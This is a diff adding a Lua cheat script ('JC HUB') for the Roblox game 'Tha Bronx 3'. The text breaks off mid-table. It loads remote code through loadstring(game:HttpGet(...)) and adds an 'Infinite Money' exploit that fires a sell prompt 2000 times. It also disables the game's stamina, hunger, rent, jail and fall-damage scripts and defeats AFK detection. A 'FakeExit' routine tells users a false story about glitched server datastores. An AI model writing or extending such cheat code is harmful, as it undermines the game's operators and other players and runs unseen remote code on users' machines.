@@ -1,0 +1,2329 @@
+local Rayfield = loadstring(game:HttpGet('https://[Log in to view URL]'))()
+
+local customTheme = {
+   TextColor = Color3.fromRGB(57, 255, 20),
+   Background = Color3.fromRGB(0, 0, 0),
+   Topbar = Color3.fromRGB(0, 0, 0),
+   Shadow = Color3.fromRGB(0, 0, 0),
+   NotificationBackground = Color3.fromRGB(0, 0, 0),
+   NotificationActionsBackground = Color3.fromRGB(0, 0, 0),
+   TabBackground = Color3.fromRGB(0, 0, 0),
+   TabStroke = Color3.fromRGB(57, 255, 20),
+   TabBackgroundSelected = Color3.fromRGB(0, 0, 0),
+   TabTextColor = Color3.fromRGB(57, 255, 20),
+   SelectedTabTextColor = Color3.fromRGB(57, 255, 20),
+   ElementBackground = Color3.fromRGB(0, 0, 0),
+   ElementBackgroundHover = Color3.fromRGB(0, 0, 0),
+   SecondaryElementBackground = Color3.fromRGB(0, 0, 0),
+   ElementStroke = Color3.fromRGB(57, 255, 20),
+   SecondaryElementStroke = Color3.fromRGB(57, 255, 20),
+   SliderBackground = Color3.fromRGB(0, 0, 0),
+   SliderProgress = Color3.fromRGB(57, 255, 20),
+   SliderStroke = Color3.fromRGB(57, 255, 20),
+   ToggleBackground = Color3.fromRGB(0, 0, 0),
+   ToggleEnabled = Color3.fromRGB(57, 255, 20),
+   ToggleDisabled = Color3.fromRGB(57, 255, 20),
+   ToggleEnabledStroke = Color3.fromRGB(57, 255, 20),
+   ToggleDisabledStroke = Color3.fromRGB(57, 255, 20),
+   ToggleEnabledOuterStroke = Color3.fromRGB(57, 255, 20),
+   ToggleDisabledOuterStroke = Color3.fromRGB(57, 255, 20),
+   DropdownSelected = Color3.fromRGB(57, 255, 20),
+   DropdownUnselected = Color3.fromRGB(0, 0, 0),
+   InputBackground = Color3.fromRGB(0, 0, 0),
+   InputStroke = Color3.fromRGB(57, 255, 20),
+   PlaceholderColor = Color3.fromRGB(57, 255, 20),
+   KeyInputBackground = Color3.fromRGB(0, 0, 0),
+   KeyInputTextColor = Color3.fromRGB(57, 255, 20)
+}
+
+local Window = Rayfield:CreateWindow({
+   Name = "JC HUB V.2.3 | Tha Bronx 3",
+   Icon = nil,
+   LoadingTitle = "Loading...",
+   LoadingSubtitle = "By Jose Carlos",
+   Theme = customTheme,
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+   ConfigurationSaving = {
+      Enabled = false,
+      FolderName = "BlackThemeHub",
+      FileName = "BigHub"
+   },
+   Discord = {
+      Enabled = true,
+      Invite = "fMSrMaKH",
+      RememberJoins = true
+   },
+   KeySystem = false,
+   KeySettings = {
+      Title = "X-Dk | V1 ",
+      Subtitle = "Enter Key Below",
+      Note = "Buy A Key At Discord.gg/dkshub",
+      FileName = "Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {""},
+      Theme = customTheme
+   }
+})
+
+-- ✅ Fixed version of your script with all duplicate variable issues and syntax errors corrected:
+
+local MainTab = Window:CreateTab("Main", 4483362458)
+local MainSection1 = MainTab:CreateSection("Welcome!")
+
+local Paragraph1 = MainTab:CreateParagraph({Title = "Welcome!", Content = "Thank you for using JC HUB"})
+
+local MainSection2 = MainTab:CreateSection("User Information")
+
+local player = game.Players.LocalPlayer
+local username = player.Name
+MainTab:CreateLabel("Player: " .. username)
+
+local userId = player.UserId
+MainTab:CreateLabel("User Id: " .. userId)
+
+local MainSection3 = MainTab:CreateSection("Game and Executor")
+
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+MainTab:CreateLabel("Game: " .. gameName)
+
+local executorName = "Unknown Executor"
+
+if syn and syn.version then
+    executorName = "Synapse X"
+elseif isfolder and isfile then
+    executorName = "ScriptWare"
+elseif isexecutorenv and isexecutorenv() then
+    executorName = "KRNL"
+elseif getexecutorname and getexecutorname() == "Fluxus" then
+    executorName = "Fluxus"
+elseif gethui then
+    executorName = "WeAreDevs (JJSploit)"
+elseif ishydrogenexecutor then
+    executorName = "Hydrogen"
+elseif pcall(function() return is_sentinel and is_sentinel() end) then
+    executorName = "Sentinel"
+elseif is_protosmasher then
+    executorName = "Protosmasher"
+elseif getexecutorname and getexecutorname() == "VegaX" then
+    executorName = "VegaX"
+elseif _G.DeltaExecutor then
+    executorName = "Delta"
+end
+
+MainTab:CreateLabel("Executor: " .. executorName)
+
+MainTab:CreateSection("Hardware")
+
+local function getHWID()
+    if syn and syn.request then
+        return syn.crypt and syn.crypt.hash or "Synapse HWID Unavailable"
+    elseif identifyexecutor and identifyexecutor():lower():find("scriptware") then
+        return "ScriptWare HWID is not publicly accessible"
+    elseif gethwid then
+        return gethwid()
+    elseif fluxus and fluxus.gethwid then
+        return fluxus.gethwid()
+    elseif isexecutorenv and isexecutorenv() then
+        return getgenv().KRNL_ID or "KRNL HWID Unavailable"
+    end
+    return "HWID Not Supported"
+end
+
+local hwid = getHWID()
+MainTab:CreateLabel("HWID: " .. hwid)
+
+MainTab:CreateSection("Date + Time")
+
+local currentDate = os.date("%Y-%m-%d")
+MainTab:CreateLabel("Date: " .. currentDate)
+
+local currentTime = os.date("%H:%M:%S")
+MainTab:CreateLabel("Time: " .. currentTime)
+
+MainTab:CreateSection("Credits")
+
+MainTab:CreateButton({
+    Name = "Join Discord!", 
+    Callback = function()
+        if setclipboard then
+            setclipboard("https://[Log in to view URL]")
+            print("Copied to clipboard!")
+        else
+            print("Your executor does not support setclipboard.")
+        end
+
+        Rayfield:Notify({
+            Title = "Link Copied!",
+            Content = "The Discord link has been copied to your clipboard.",
+            Duration = 8.5
+        })
+    end,
+})
+
+local ConstructionTab = Window:CreateTab("Construction", 4483362458)
+local ConstructionSection1 = ConstructionTab:CreateSection("Note")
+
+local Paragraph2 = ConstructionTab:CreateParagraph({Title = "Note", Content = "if u experience the error were it does not equip plywood please reexecute the script and try again."})
+
+ConstructionTab:CreateButton({
+    Name = "Infinite Money",
+    Callback = function()
+        print("Infinite Money button clicked!")
+
+        local World = game.Workspace
+        local SharedStorage = game.ReplicatedStorage
+        local Player = game.Players.LocalPlayer
+        local Rio = {}
+
+        local function Notify(title, desc, time)
+            Rayfield:Notify({
+                Title = title,
+                Content = desc,
+                Duration = time or 5
+            })
+        end
+
+        local function InvokeServer(Remote, ...)
+            return Remote:InvokeServer(...)
+        end
+
+        local function FindItem(name)
+            return Player.Backpack:FindFirstChild(name) or Player.Character and Player.Character:FindFirstChild(name)
+        end
+
+        local function GetValue(path)
+            local val = Player:FindFirstChild("stored") and Player.stored:FindFirstChild(path)
+            return val and val.Value or 0
+        end
+
+        local function Teleport(pos)
+            if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+                Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+            end
+        end
+
+        local function BuySupplies()
+            local Items = { "Ice-Fruit Bag", "Ice-Fruit Cupz", "FijiWater", "FreshWater" }
+            if not SharedStorage:FindFirstChild("ExoticStock") or not SharedStorage:FindFirstChild("ExoticShopRemote") then
+                return false
+            end
+
+            for _, item in ipairs(Items) do
+                local stock = SharedStorage.ExoticStock:FindFirstChild(item)
+                if not stock or stock.Value == 0 then return false end
+            end
+
+            for _, item in ipairs(Items) do
+                local success = pcall(function()
+                    InvokeServer(SharedStorage.ExoticShopRemote, item)
+                end)
+                if not success then return false end
+                task.wait(1.25)
+            end
+
+            for _, item in ipairs(Items) do
+                if not FindItem(item) then return false end
+            end
+            return true
+        end
+
+        local function GetCookingPot()
+            if not World:FindFirstChild("CookingPots") then return nil end
+            for _, pot in ipairs(World.CookingPots:GetChildren()) do
+                local owner = pot:FindFirstChild("Owner")
+                local cook = pot:FindFirstChild("CookPart")
+                local progress = cook and cook:FindFirstChild("Steam") and cook.Steam:FindFirstChild("LoadUI")
+                if pot:IsA("Model") and owner and cook and progress and not owner.Value and not progress.Enabled then
+                    return pot
+                end
+            end
+            return nil
+        end
+
+        local function FakeExit()
+            Notify("Infinite Money Failed", "This server has datastores GLITCHED. Please join a different server!", 10)
+            task.wait(0.25)
+            Rio.InfiniteMoney = false
+        end
+
+        -- Start process
+        local money = GetValue("Money")
+        if money < 2750 then
+            Notify("WARNING", "Insufficient funds detected! You need at least 2750 to proceed.", 5)
+            return
+        end
+
+        if not BuySupplies() then
+            FakeExit()
+            return
+        end
+
+        local CookingPot = GetCookingPot()
+        if not CookingPot then
+            FakeExit()
+            return
+        end
+
+        local CookPart = CookingPot:FindFirstChild("CookPart")
+        local CookPrompt = CookPart and CookPart:FindFirstChild("ProximityPrompt")
+        local CookProgress = CookPart and CookPart:FindFirstChild("Steam") and CookPart.Steam:FindFirstChild("LoadUI")
+
+        if not (CookPart and CookPrompt and CookProgress) then
+            FakeExit()
+            return
+        end
+
+        local FijiWater = FindItem("FijiWater")
+        local FreshWater = FindItem("FreshWater")
+        local IceFruitBag = FindItem("Ice-Fruit Bag")
+        local IceFruitCupz = FindItem("Ice-Fruit Cupz")
+
+        if not (FijiWater and FreshWater and IceFruitBag and IceFruitCupz) then
+            FakeExit()
+            return
+        end
+
+        local CookOrder = { FijiWater, FreshWater, IceFruitBag }
+
+        Teleport(CookPart.Position)
+        task.wait(0.25)
+
+        local success, err = pcall(function()
+            fireproximityprompt(CookPrompt, 0)
+        end)
+        if not success then
+            print("Error: " .. err)
+            FakeExit()
+            return
+        end
+        task.wait(0.25)
+
+        for _, item in ipairs(CookOrder) do
+            Player.Character.Humanoid:EquipTool(item)
+            task.wait(0.5)
+
+            local success, err = pcall(function()
+                fireproximityprompt(CookPrompt, 0)
+            end)
+            if not success then
+                print("Error adding item: " .. err)
+                FakeExit()
+                return
+            end
+            task.wait(5)
+        end
+
+        while CookProgress.Enabled do
+            task.wait(10)
+        end
+
+        Teleport(CookPart.Position)
+        task.wait(0.25)
+
+        Player.Character.Humanoid:EquipTool(IceFruitCupz)
+        task.wait(0.1)
+
+        local success, err = pcall(function()
+            fireproximityprompt(CookPrompt, 0)
+        end)
+        if not success then
+            print("Final cook error: " .. err)
+            FakeExit()
+            return
+        end
+        task.wait(1)
+
+        local SellPart = World:FindFirstChild("IceFruit Sell")
+        local SellPrompt = SellPart and SellPart:FindFirstChild("ProximityPrompt")
+        if not (SellPart and SellPrompt) then
+            FakeExit()
+            return
+        end
+
+        Teleport(SellPart.Position)
+        task.wait(0.25)
+
+        for _ = 1, 2000 do
+            local success, err = pcall(function()
+                fireproximityprompt(SellPrompt, 0)
+            end)
+            if not success then
+                print("Sell error: " .. err)
+                FakeExit()
+                return
+            end
+        end
+
+        Notify("Success", "Infinite Money Enabled!", 5)
+    end
+})
+
+local AutofarmTab = Window:CreateTab("Autofarm", 4483362458)
+local AutofarmSection1 = AutofarmTab:CreateSection("Auto-cook")
+
+local function TeleportToLocation()
+    local targetPosition = Vector3.new(-609, 261, -751)
+    game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
+end
+
+AutofarmTab:CreateButton({
+    Name = "Goto Pot",
+    Callback = function()
+        TeleportToLocation()
+    end,
+})
+
+local Paragraph = AutofarmTab:CreateParagraph({Title = "Note", Content = "To Start this autofarm press goto pot then press buy supplies then cook them in the pot then equip the cup then press sell items"})
+
+local SharedStorage = game.ReplicatedStorage
+
+local function InvokeServer(Remote, ...)
+    return Remote:InvokeServer(...)
+end
+
+local function FindItem(Item)
+    return game.Players.LocalPlayer.Backpack:FindFirstChild(Item) or game.Players.LocalPlayer.Character:FindFirstChild(Item)
+end
+
+local function AutoBuySupplies()
+    local Items = {
+        "Ice-Fruit Bag",
+        "Ice-Fruit Cupz",
+        "FijiWater",
+        "FreshWater",
+    }
+
+    for _, item in ipairs(Items) do
+        local ItemStock = SharedStorage.ExoticStock:FindFirstChild(item)
+        if not ItemStock or ItemStock.Value == 0 then
+            warn("Item out of stock:", item)
+            return false
+        end
+    end
+
+    for _, item in ipairs(Items) do
+        InvokeServer(SharedStorage.ExoticShopRemote, item)
+        task.wait(1.25)
+    end
+
+    for _, item in ipairs(Items) do
+        if not FindItem(item) then
+            warn("Failed to acquire:", item)
+            return false
+        end
+    end
+
+    return true
+end
+
+AutofarmTab:CreateButton({
+    Name = "Purchase Supplies",
+    Callback = function()
+        local success = AutoBuySupplies()
+        if success then
+            Rayfield:Notify({
+                Title = "AutoBuy",
+                Content = "Items purchased successfully!",
+                Duration = 5,
+                Image = 4483362458,
+            })
+        else
+            Rayfield:Notify({
+                Title = "AutoBuy",
+                Content = "Failed to purchase items!",
+                Duration = 5,
+                Image = 4483362458,
+            })
+        end
+    end,
+})
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local autoInteract = false
+
+AutofarmTab:CreateToggle({
+    Name = "Sell Items",
+    CurrentValue = false,
+    Callback = function(Value)
+        autoInteract = Value
+
+        if autoInteract then
+            local function teleportAndEquip()
+                local character = player.Character or player.CharacterAdded:Wait()
+                local rootPart = character:WaitForChild("HumanoidRootPart")
+                rootPart.CFrame = CFrame.new(-49, 287, -338)
+                local backpack = player:WaitForChild("Backpack")
+                local tool = backpack:FindFirstChild("Ice-Fruit Cupz")
+                if tool then
+                    tool.Parent = character
+                end
+            end
+
+            teleportAndEquip()
+
+            task.spawn(function()
+                while autoInteract do
+                    local character = player.Character or player.CharacterAdded:Wait()
+                    local rootPart = character:WaitForChild("HumanoidRootPart")
+
+                    for _, instance in ipairs(workspace:GetDescendants()) do
+                        if instance:IsA("ProximityPrompt") then
+                            local prompt = instance
+                            local targetPart = prompt.Parent
+                            if targetPart and targetPart:IsA("BasePart") and rootPart and rootPart.Parent then
+                                local distance = (targetPart.Position - rootPart.Position).Magnitude
+                                if distance <= prompt.MaxActivationDistance then
+                                    prompt:InputHoldBegin()
+                                    task.wait(prompt.HoldDuration)
+                                    prompt:InputHoldEnd()
+                                end
+                            end
+                        end
+                    end
+
+                    task.wait(0.2)
+                end
+            end)
+        end
+    end,
+})
+
+local AutofarmSection = AutofarmTab:CreateSection("Anti Afk")
+
+local function openAntiAFKUI()
+    local AntiAFKUI = Instance.new("ScreenGui")
+    AntiAFKUI.Name = "AntiAFKUI"
+    AntiAFKUI.ResetOnSpawn = false
+    AntiAFKUI.Parent = game:GetService("CoreGui")
+
+    local Frame = Instance.new("Frame")
+    Frame.Size = UDim2.new(0, 150, 0, 60)
+    Frame.Position = UDim2.new(0.5, -75, 0.5, -30)
+    Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10) -- black
+    Frame.BorderSizePixel = 2
+    Frame.BorderColor3 = Color3.fromRGB(150, 0, 255) -- purple
+    Frame.Draggable = true
+    Frame.Active = true
+    Frame.Selectable = true
+    Frame.Parent = AntiAFKUI
+
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, 0, 0.5, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "X-Dk"
+    Title.TextColor3 = Color3.fromRGB(150, 0, 255) -- purple
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 14
+    Title.Parent = Frame
+
+    local FooterBg = Instance.new("Frame")
+    FooterBg.Size = UDim2.new(1, 0, 0.5, 0)
+    FooterBg.Position = UDim2.new(0, 0, 0.5, 0)
+    FooterBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- darker black
+    FooterBg.BorderSizePixel = 0
+    FooterBg.Parent = Frame
+
+    local Footer = Instance.new("TextLabel")
+    Footer.Size = UDim2.new(1, 0, 1, 0)
+    Footer.BackgroundTransparency = 1
+    Footer.Text = "X-Dk Anti AFK"
+    Footer.TextColor3 = Color3.fromRGB(200, 0, 255) -- light purple
+    Footer.Font = Enum.Font.Gotham
+    Footer.TextSize = 12
+    Footer.Parent = FooterBg
+
+    game:GetService("Players").LocalPlayer.Idled:Connect(function()
+        game:GetService("VirtualUser"):CaptureController()
+        game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+    end)
+end
+
+AutofarmTab:CreateButton({
+    Name = "Anti AFK",
+    Callback = function()
+        openAntiAFKUI()
+    end
+})
+
+local MiscTab = Window:CreateTab("Misc", 4483362458) -- Title, Image
+local MiscSection = MiscTab:CreateSection("In-Game")
+
+local AntiStaminaEnabled = false
+MiscTab:CreateToggle({
+    Name = "Inf Stamina",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiStaminaEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiStaminaEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player:FindFirstChild("PlayerGui") then
+                        local staminaScript = player.PlayerGui:FindFirstChild("Run") 
+                            and player.PlayerGui.Run:FindFirstChild("Frame") 
+                            and player.PlayerGui.Run.Frame:FindFirstChild("Frame") 
+                            and player.PlayerGui.Run.Frame.Frame:FindFirstChild("Frame") 
+                            and player.PlayerGui.Run.Frame.Frame.Frame:FindFirstChild("StaminaBarScript")
+                        if staminaScript then
+                            staminaScript.Disabled = true
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiHungerEnabled = false
+MiscTab:CreateToggle({
+    Name = "Inf Hunger",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiHungerEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiHungerEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player:FindFirstChild("PlayerGui") then
+                        local hungerGui = player.PlayerGui:FindFirstChild("Hunger")
+                        if hungerGui then
+                            local hungerScript = hungerGui:FindFirstChild("Frame") 
+                                and hungerGui.Frame:FindFirstChild("Frame") 
+                                and hungerGui.Frame.Frame:FindFirstChild("Frame") 
+                                and hungerGui.Frame.Frame.Frame:FindFirstChild("HungerBarScript")
+                            if hungerScript then
+                                hungerScript.Disabled = true
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiSleepEnabled = false
+MiscTab:CreateToggle({
+    Name = "Inf Sleep",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiSleepEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiSleepEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player:FindFirstChild("PlayerGui") then
+                        local sleepGui = player.PlayerGui:FindFirstChild("SleepGui")
+                        if sleepGui then
+                            local sleepScript = sleepGui:FindFirstChild("Frame") 
+                                and sleepGui.Frame:FindFirstChild("sleep") 
+                                and sleepGui.Frame.sleep:FindFirstChild("SleepBar") 
+                                and sleepGui.Frame.sleep.SleepBar:FindFirstChild("sleepScript")
+                            if sleepScript then
+                                sleepScript.Disabled = true
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiFallEnabled = false
+MiscTab:CreateToggle({
+    Name = "No Fall Damage",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiFallEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiFallEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player.Character then
+                        local fallDamage = player.Character:FindFirstChild("FallDamageRagdoll")
+                        if fallDamage then
+                            fallDamage.Disabled = true
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+MiscTab:CreateToggle({
+    Name = "No Jump Cooldown",
+    CurrentValue = false,
+    Flag = "NoJumpCooldownFlag",
+    Callback = function(State)
+        if State then
+            getgenv().NoJumpCooldown = true
+            task.spawn(function()
+                while getgenv().NoJumpCooldown do
+                    local character = LocalPlayer.Character
+                    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+                    if humanoid then
+                        humanoid.Jump = true
+                    end
+                    task.wait()
+                end
+            end)
+        else
+            getgenv().NoJumpCooldown = false
+        end
+    end
+})
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local lastPosition
+local respawnConnection
+local deathConnection
+
+MiscTab:CreateToggle({
+    Name = "Respawn Where Died",
+    CurrentValue = false,
+    Flag = "RespawnWhereDied",
+    Callback = function(state)
+        if state then
+            local function setup()
+                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+                local humanoid = character:WaitForChild("Humanoid")
+                local root = character:WaitForChild("HumanoidRootPart")
+
+                deathConnection = humanoid.Died:Connect(function()
+                    if root then
+                        lastPosition = root.CFrame
+                    end
+                end)
+
+                respawnConnection = LocalPlayer.CharacterAdded:Connect(function(char)
+                    local newRoot = char:WaitForChild("HumanoidRootPart")
+                    if lastPosition then
+                        newRoot.CFrame = lastPosition
+                    end
+                    setup()
+                end)
+            end
+
+            setup()
+        else
+            if respawnConnection then
+                respawnConnection:Disconnect()
+                respawnConnection = nil
+            end
+            if deathConnection then
+                deathConnection:Disconnect()
+                deathConnection = nil
+            end
+        end
+    end,
+})
+
+local AntiRentPayEnabled = false
+MiscTab:CreateToggle({
+    Name = "No Rent Pay",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiRentPayEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiRentPayEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    local rentGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("RentGui")
+                    if rentGui then
+                        local rentScript = rentGui:FindFirstChild("LocalScript")
+                        if rentScript then
+                            rentScript.Disabled = true
+                            rentScript:Destroy()
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local AntiCameraShakeEnabled = false
+local AntiCameraShakeToggle = MiscTab:CreateToggle({
+    Name = "No Camera Bobbing",
+    CurrentValue = false,
+    Callback = function(Value)
+        AntiCameraShakeEnabled = Value
+        if Value then
+            task.spawn(function()
+                while AntiCameraShakeEnabled do
+                    task.wait(1)
+                    local player = game.Players.LocalPlayer
+                    if player and player.Character then
+                        local cameraBobbing = player.Character:FindFirstChild("CameraBobbing")
+                        if cameraBobbing then
+                            cameraBobbing:Destroy()
+                        end
+                    end
+                end
+            end)
+        end
+    end
+})
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+MiscTab:CreateToggle({
+    Name = "No Jail",
+    CurrentValue = false,
+    Callback = function(Value)
+        local jailRemote = ReplicatedStorage:FindFirstChild("JailRemote")
+        if Value then
+            if jailRemote then
+                jailRemote:Destroy()
+            end
+        end
+    end,
+})
+
+
+
+local UtilitiesTab = Window:CreateTab("Utilities", 4483362458)
+local UtilitiesSection = UtilitiesTab:CreateSection("Screen")
+
+local blackScreen = Instance.new("ScreenGui")
+blackScreen.IgnoreGuiInset = true
+blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+blackScreen.ResetOnSpawn = false
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.Position = UDim2.new(0, 0, 0, 0)
+blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+blackFrame.BackgroundTransparency = 0
+blackFrame.Parent = blackScreen
+
+blackScreen.Enabled = false
+blackScreen.Parent = game.CoreGui
+
+UtilitiesTab:CreateToggle({
+	Name = "Black Screen",
+	CurrentValue = false,
+	Flag = "BlackScreenToggle",
+	Callback = function(Value)
+		blackScreen.Enabled = Value
+	end,
+})
+
+local blackScreen = Instance.new("ScreenGui")
+blackScreen.IgnoreGuiInset = true
+blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+blackScreen.ResetOnSpawn = false
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.Position = UDim2.new(0, 0, 0, 0)
+blackFrame.BackgroundColor3 = Color3.new(255,255,255)
+blackFrame.BackgroundTransparency = 0
+blackFrame.Parent = blackScreen
+
+blackScreen.Enabled = false
+blackScreen.Parent = game.CoreGui
+
+UtilitiesTab:CreateToggle({
+	Name = "White Screen",
+	CurrentValue = false,
+	Flag = "BlackScreenToggle",
+	Callback = function(Value)
+		blackScreen.Enabled = Value
+	end,
+})
+
+local UtilitiesSection = UtilitiesTab:CreateSection("Time Of Day")
+
+UtilitiesTab:CreateSlider({
+    Name = "Time of Day",
+    Range = {0, 24},
+    Increment = 0.25,
+    Suffix = "Hours",
+    CurrentValue = 12,
+    Flag = "TimeSlider",
+    Callback = function(Value)
+        local hours = math.floor(Value)
+        local minutes = math.floor((Value - hours) * 60)
+        game.Lighting.TimeOfDay = string.format("%02d:%02d:00", hours, minutes)
+    end,
+})
+
+UtilitiesTab:CreateButton({
+    Name = "Full Bright",
+    Callback = function()
+        local lighting = game:GetService("Lighting")
+        lighting.Brightness = 2
+        lighting.ClockTime = 12
+        lighting.FogEnd = 100000
+        lighting.GlobalShadows = false
+        lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
+    end,
+})
+
+UtilitiesTab:CreateButton({
+    Name = "No Fog",
+    Callback = function()
+        local lighting = game:GetService("Lighting")
+        lighting.FogStart = 100000
+        lighting.FogEnd = 100000
+    end,
+})
+
+local UtilitiesSection = UtilitiesTab:CreateSection("Player Features")
+
+UtilitiesTab:CreateButton({
+    Name = "Naked (Client Sided)",
+    Default = false,
+    Callback = function(Value)
+        local character = game.Players.LocalPlayer.Character
+        if character then
+            for _, item in pairs(character:GetChildren()) do
+                if item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then
+                    item:Destroy()
+                end
+            end
+            for _, accessory in pairs(character:GetChildren()) do
+                if accessory:IsA("Accessory") then
+                    accessory:Destroy()
+                end
+            end
+            if not Value then
+            end
+        end
+    end,
+})
+
+UtilitiesTab:CreateButton({
+    Name = "No Face",
+    Callback = function()
+        local character = game.Players.LocalPlayer.Character
+        if character then
+            local head = character:FindFirstChild("Head")
+            if head then
+                local face = head:FindFirstChild("face")
+                if face then
+                    face:Destroy()
+                end
+            end
+        end
+    end,
+})
+
+local UtilitiesSection = UtilitiesTab:CreateSection("Other")
+
+UtilitiesTab:CreateToggle({
+    Name = "Instant Interact",
+    Default = false,
+    Callback = function(Value)
+        local Workspace = game:GetService("Workspace")
+        local function updateProximityPrompts()
+            for i, v in ipairs(Workspace:GetDescendants()) do
+                if v.ClassName == "ProximityPrompt" then
+                    v.HoldDuration = Value and 0 or 1
+                end
+            end
+        end
+        updateProximityPrompts()
+        Workspace.DescendantAdded:Connect(function(descendant)
+            if descendant.ClassName == "ProximityPrompt" then
+                descendant.HoldDuration = Value and 0 or 1
+            end
+        end)
+    end,
+})
+
+UtilitiesTab:CreateButton({
+    Name = "Drop All Tools",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local backpack = player:FindFirstChild("Backpack")
+        local character = player.Character or player.CharacterAdded:Wait()
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Parent = character
+                task.wait(0.1)
+                tool.Parent = workspace
+            end
+        end
+        for _, tool in ipairs(character:GetChildren()) do
+            if tool:IsA("Tool") then
+                tool.Parent = workspace
+            end
+        end
+    end,
+})
+
+UtilitiesTab:CreateSlider({
+    Name = "FOV",
+    Range = {70, 120},
+    Increment = 1,
+    Suffix = "Units",
+    CurrentValue = 70,
+    Callback = function(Value)
+        game.Workspace.CurrentCamera.FieldOfView = Value
+    end,
+})
+
+local TeleportTab = Window:CreateTab("Teleport", 4483362458)
+local TeleportSection = TeleportTab:CreateSection("Teleports")
+
+-- Spawn Locations
+local teleportLocations_Spawn = {
+    {Name = "Spawn Location 1", Position = CFrame.new(-357.28, 279.95, -1177.15)},
+    {Name = "Spawn Location 2", Position = CFrame.new(-1495.00, 249.88, -1235.86)},
+    {Name = "Spawn Location 3", Position = CFrame.new(-999.25, 250.59, -1065.42)},
+}
+
+local locationNames_Spawn = {}
+for _, location in ipairs(teleportLocations_Spawn) do
+    table.insert(locationNames_Spawn, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Spawn Locations",
+    Options = locationNames_Spawn,
+    CurrentOption = {locationNames_Spawn[1]},
+    MultipleOptions = false,
+    Flag = "SpawnDropdown",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Spawn) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+-- Gun Stores
+local teleportLocations_Gun = {
+    {Name = "Gun Shop 1", Position = CFrame.new(92995, 122098, 17023)},
+    {Name = "Gun Shop 2", Position = CFrame.new(66190, 123616, 5744)},
+}
+
+local locationNames_Gun = {}
+for _, location in ipairs(teleportLocations_Gun) do
+    table.insert(locationNames_Gun, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Gun Stores",
+    Options = locationNames_Gun,
+    CurrentOption = {locationNames_Gun[1]},
+    MultipleOptions = false,
+    Flag = "GunDropdown",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Gun) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+-- Jobs
+local teleportLocations_Jobs = {
+    {Name = "Plant Job", Position = CFrame.new(-1541, 282, -987)},
+    {Name = "Laptop Job", Position = CFrame.new(-1017, 253, -249)},
+    {Name = "Mop Job", Position = CFrame.new(-729, 254, -778)},
+    {Name = "Rice Job", Position = CFrame.new(51375, 21680, 5842)},
+}
+
+local locationNames_Jobs = {}
+for _, location in ipairs(teleportLocations_Jobs) do
+    table.insert(locationNames_Jobs, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Jobs",
+    Options = locationNames_Jobs,
+    CurrentOption = {locationNames_Jobs[1]},
+    MultipleOptions = false,
+    Flag = "JobsDropdown",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Jobs) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+-- Apartments
+local teleportLocations_Apartments = {
